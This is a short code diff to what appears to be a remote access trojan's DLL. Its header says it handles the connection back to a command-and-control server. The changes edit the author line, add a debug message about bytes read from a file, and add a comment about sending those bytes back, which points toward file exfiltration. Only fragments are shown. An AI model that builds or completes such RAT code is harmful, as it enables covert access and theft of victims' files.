@@ -1,4 +1,4 @@
-// Patrick Sacchet
+// Patrick Sacchet (@pjsacchet)
 // Verison 1.0
 // RAT-Dll-Connect.cpp : This file contains functionality for handling our connection back to our C2 server
 
@@ -116,7 +116,11 @@ INT startListen()
                          OutputDebugStringA(msgBuf);
                          goto cleanup;
                      }
+
+                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Read %s bytes from file\n", fileBytes);
                  }
+
+                 // Now send back our bytes...
 
                  
              }
